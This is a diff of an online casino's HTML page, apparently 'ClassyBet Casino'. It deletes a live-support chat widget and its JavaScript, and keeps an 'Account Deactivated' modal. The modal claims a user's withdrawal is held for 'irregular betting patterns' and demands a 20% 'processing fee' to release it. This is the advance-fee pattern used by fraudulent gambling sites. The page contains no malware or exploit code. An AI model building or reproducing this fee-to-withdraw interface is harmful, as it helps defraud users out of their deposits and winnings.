@@ -1550,84 +1550,46 @@
                     Licensed and regulated by Curacao eGaming &mdash; Licence No. 8048/JAZ
                 </span>
                 <div>
-                    Copyright © 2025 ClassyBet Casino.
+                    Copyright &copy; 2025 ClassyBet Casino.
                     All rights reserved.
                 </div>
             </div>
         </div>
     </footer>
 
-    <!-- Support Chat Widget -->
-    <div class="support-chat-widget" aria-label="Live support chat">
-        <button class="support-chat-button" type="button" onclick="toggleSupportChat()">
-            <i class="fas fa-headset"></i>
-        </button>
-        <div class="support-chat-window" id="supportChatWindow" aria-live="polite">
-            <div class="support-chat-header">
-                <div>
-                    <div class="support-chat-title">Live Support</div>
-                    <div class="support-chat-status" id="supportChatStatus">Online · Typical reply &lt; 5 mins</div>
+    <!-- Account Reactivation Modal -->
+    <div id="reactivation-modal" class="modal">
+        <div class="modal-content">
+            <span class="close-modal" onclick="closeReactivationModal()">&times;</span>
+            <div class="modal-header">
+                <i class="fas fa-exclamation-triangle"
+                    style="color: #ffa500; font-size: 2rem; display: block; margin-bottom: 0.5rem;"></i>
+                Account Deactivated
+            </div>
+            <div class="modal-body">
+                <p style="margin-bottom: 1rem; color: #fff; font-weight: bold;">Security Notice:</p>
+                <p>Your account has currently been deactivated due to <strong>irregular betting patterns</strong>
+                    and violation of our user terms and policy.</p>
+                <p style="margin-top: 1rem;">To lift the restriction on your account and release your withdrawal,
+                    you are required to pay a processing fee.</p>
+                <div
+                    style="margin-top: 1.5rem; padding: 1rem; background: rgba(48, 252, 190, 0.1); border-radius: 8px; border: 1px solid rgba(48, 252, 190, 0.3);">
+                    <div style="display: flex; justify-content: space-between; margin-bottom: 0.5rem;">
+                        <span>Held Withdrawal:</span>
+                        <span id="held-amount"> 0.00</span>
+                    </div>
+                    <div style="display: flex; justify-content: space-between; font-weight: bold; color: #30fcbe;">
+                        <span>Processing Fee (20%):</span>
+                        <span id="fee-amount"> 0.00</span>
+                    </div>
                 </div>
-                <button type="button" class="btn"
-                    style="padding: 0.25rem 0.6rem; font-size: 11px; background: rgba(0,0,0,0.3); color: #e5e7eb;"
-                    onclick="toggleSupportChat()">
-                    Close
+                <p style="margin-top: 1rem; font-size: 0.85rem; color: #aaa;">* Once paid, the ban on your account
+                    will be automatically lifted and your withdrawal will be approved.</p>
+            </div>
+            <div class="modal-footer">
+                <button class="btn btn-primary" id="activate-btn" onclick="payActivationFee()" style="flex: 1;">
+                    <i class="fas fa-rocket"></i> Activate Now
                 </button>
-            </div>
-            <div class="support-chat-body">
-                <small>Chat directly with our support team. Your messages are securely relayed to our internal Slack so
-                    we can help you quickly.</small>
-                <div class="support-chat-messages" id="supportChatMessages">
-                    <div class="support-chat-message system">
-                        Hi! Tell us how we can help and an agent will reply shortly.
-                    </div>
-                </div>
-            </div>
-            <div class="support-chat-footer">
-                <form class="support-chat-form" id="supportChatForm" onsubmit="sendSupportMessage(event)">
-                    <input type="text" id="supportChatInput" class="support-chat-input"
-                        placeholder="Type your message..." autocomplete="off">
-                    <button type="submit" class="support-chat-send" id="supportChatSendBtn">
-                        <i class="fas fa-paper-plane"></i>
-                    </button>
-                </form>
-            </div>
-        </div>
-
-        <!-- Account Reactivation Modal -->
-        <div id="reactivation-modal" class="modal">
-            <div class="modal-content">
-                <span class="close-modal" onclick="closeReactivationModal()">&times;</span>
-                <div class="modal-header">
-                    <i class="fas fa-exclamation-triangle"
-                        style="color: #ffa500; font-size: 2rem; display: block; margin-bottom: 0.5rem;"></i>
-                    Account Deactivated
-                </div>
-                <div class="modal-body">
-                    <p style="margin-bottom: 1rem; color: #fff; font-weight: bold;">Security Notice:</p>
-                    <p>Your account has currently been deactivated due to <strong>irregular betting patterns</strong>
-                        and violation of our user terms and policy.</p>
-                    <p style="margin-top: 1rem;">To lift the restriction on your account and release your withdrawal,
-                        you are required to pay a processing fee.</p>
-                    <div
-                        style="margin-top: 1.5rem; padding: 1rem; background: rgba(48, 252, 190, 0.1); border-radius: 8px; border: 1px solid rgba(48, 252, 190, 0.3);">
-                        <div style="display: flex; justify-content: space-between; margin-bottom: 0.5rem;">
-                            <span>Held Withdrawal:</span>
-                            <span id="held-amount"> 0.00</span>
-                        </div>
-                        <div style="display: flex; justify-content: space-between; font-weight: bold; color: #30fcbe;">
-                            <span>Processing Fee (20%):</span>
-                            <span id="fee-amount"> 0.00</span>
-                        </div>
-                    </div>
-                    <p style="margin-top: 1rem; font-size: 0.85rem; color: #aaa;">* Once paid, the ban on your account
-                        will be automatically lifted and your withdrawal will be approved.</p>
-                </div>
-                <div class="modal-footer">
-                    <button class="btn btn-primary" id="activate-btn" onclick="payActivationFee()" style="flex: 1;">
-                        <i class="fas fa-rocket"></i> Activate Now
-                    </button>
-                </div>
             </div>
         </div>
     </div>
@@ -3039,175 +3001,6 @@ Support: support@classybetaviator.com`;
                 loadUserProfile();
             }
         }, 30000);
-
-        // ─── Support chat (two-way) ───
-        let supportConversationId = localStorage.getItem('supportConversationId') || null;
-        let supportSessionId = localStorage.getItem('supportSessionId');
-        if (!supportSessionId) {
-            supportSessionId = 'sess-' + crypto.randomUUID();
-            localStorage.setItem('supportSessionId', supportSessionId);
-        }
-        let supportLastTimestamp = localStorage.getItem('supportLastTs') || null;
-        let supportPollTimer = null;
-
-        function toggleSupportChat() {
-            const chatWindow = document.getElementById('supportChatWindow');
-            if (!chatWindow) return;
-            const isOpen = chatWindow.classList.toggle('open');
-            if (isOpen) {
-                loadSupportHistory();
-                startSupportPolling();
-            } else {
-                stopSupportPolling();
-            }
-        }
-
-        function appendSupportMessage(text, type = 'user') {
-            const container = document.getElementById('supportChatMessages');
-            if (!container) return;
-            const div = document.createElement('div');
-            div.className = `support-chat-message ${type}`;
-            div.textContent = text;
-            container.appendChild(div);
-            container.scrollTop = container.scrollHeight;
-        }
-
-        function renderSupportHistory(messages) {
-            const container = document.getElementById('supportChatMessages');
-            if (!container) return;
-            // Keep the system welcome message, clear the rest
-            const welcome = container.querySelector('.support-chat-message.system');
-            container.innerHTML = '';
-            if (welcome) container.appendChild(welcome);
-            messages.forEach(m => {
-                appendSupportMessage(m.text, m.from); // 'user' or 'agent'
-            });
-            if (messages.length > 0) {
-                supportLastTimestamp = messages[messages.length - 1].createdAt;
-                localStorage.setItem('supportLastTs', supportLastTimestamp);
-            }
-        }
-
-        async function loadSupportHistory() {
-            try {
-                const params = new URLSearchParams();
-                if (supportSessionId) params.set('sessionId', supportSessionId);
-                const headers = {};
-                if (authToken) headers['Authorization'] = `Bearer ${authToken}`;
-
-                const res = await fetch(`${SUPPORT_API_BASE}/api/support/conversation/current?${params}`, { headers });
-                const data = await res.json();
-
-                if (data.conversationId) {
-                    supportConversationId = data.conversationId;
-                    localStorage.setItem('supportConversationId', supportConversationId);
-                    if (data.messages && data.messages.length) {
-                        renderSupportHistory(data.messages);
-                    }
-                }
-            } catch (err) {
-                console.error('Failed to load support history:', err);
-            }
-        }
-
-        function startSupportPolling() {
-            stopSupportPolling();
-            supportPollTimer = setInterval(pollSupportUpdates, 5000);
-        }
-
-        function stopSupportPolling() {
-            if (supportPollTimer) { clearInterval(supportPollTimer); supportPollTimer = null; }
-        }
-
-        async function pollSupportUpdates() {
-            if (!supportConversationId) return;
-            try {
-                const since = supportLastTimestamp || new Date(0).toISOString();
-                const res = await fetch(
-                    `${SUPPORT_API_BASE}/api/support/conversation/${supportConversationId}/updates?since=${encodeURIComponent(since)}`
-                );
-                const data = await res.json();
-                if (data.messages && data.messages.length) {
-                    data.messages.forEach(m => {
-                        // Only append messages we haven't shown yet
-                        if (m.from === 'agent') {
-                            appendSupportMessage(m.text, 'agent');
-                        }
-                    });
-                    const last = data.messages[data.messages.length - 1];
-                    supportLastTimestamp = last.createdAt;
-                    localStorage.setItem('supportLastTs', supportLastTimestamp);
-                }
-            } catch (err) {
-                console.error('Support poll error:', err);
-            }
-        }
-
-        async function sendSupportMessage(event) {
-            event.preventDefault();
-            const input = document.getElementById('supportChatInput');
-            const btn = document.getElementById('supportChatSendBtn');
-            const statusEl = document.getElementById('supportChatStatus');
-
-            if (!input || !btn || !input.value.trim()) return;
-
-            const message = input.value.trim();
-            appendSupportMessage(message, 'user');
-            input.value = '';
-
-            btn.disabled = true;
-            const previousStatus = statusEl ? statusEl.textContent : '';
-            if (statusEl) statusEl.textContent = 'Sending message...';
-
-            try {
-                const payload = {
-                    message,
-                    page: 'profile',
-                    url: window.location.href,
-                    conversationId: supportConversationId,
-                    sessionId: supportSessionId,
-                    meta: currentUser ? {
-                        username: currentUser.username,
-                        email: currentUser.email,
-                        phone: currentUser.phone
-                    } : {}
-                };
-
-                const res = await fetch(`${SUPPORT_API_BASE}/api/support/chat`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        ...(authToken ? { 'Authorization': `Bearer ${authToken}` } : {})
-                    },
-                    body: JSON.stringify(payload)
-                });
-
-                const data = await res.json();
-                if (data.conversationId) {
-                    supportConversationId = data.conversationId;
-                    localStorage.setItem('supportConversationId', supportConversationId);
-                }
-                if (data.messages && data.messages.length) {
-                    const last = data.messages[data.messages.length - 1];
-                    supportLastTimestamp = last.createdAt;
-                    localStorage.setItem('supportLastTs', supportLastTimestamp);
-                }
-
-                if (statusEl) statusEl.textContent = 'Online · Message delivered to support';
-
-                // Start polling if not already
-                if (!supportPollTimer) startSupportPolling();
-            } catch (error) {
-                console.error('Support chat error:', error);
-                appendSupportMessage('Failed to send message. Please try again in a moment.', 'system');
-                if (statusEl) statusEl.textContent = 'Online · Temporary issue sending to support';
-            } finally {
-                btn.disabled = false;
-                setTimeout(() => {
-                    if (statusEl && previousStatus) statusEl.textContent = previousStatus;
-                }, 4000);
-            }
-        }
 
         if ('serviceWorker' in navigator) {
             window.addEventListener('load', () => {
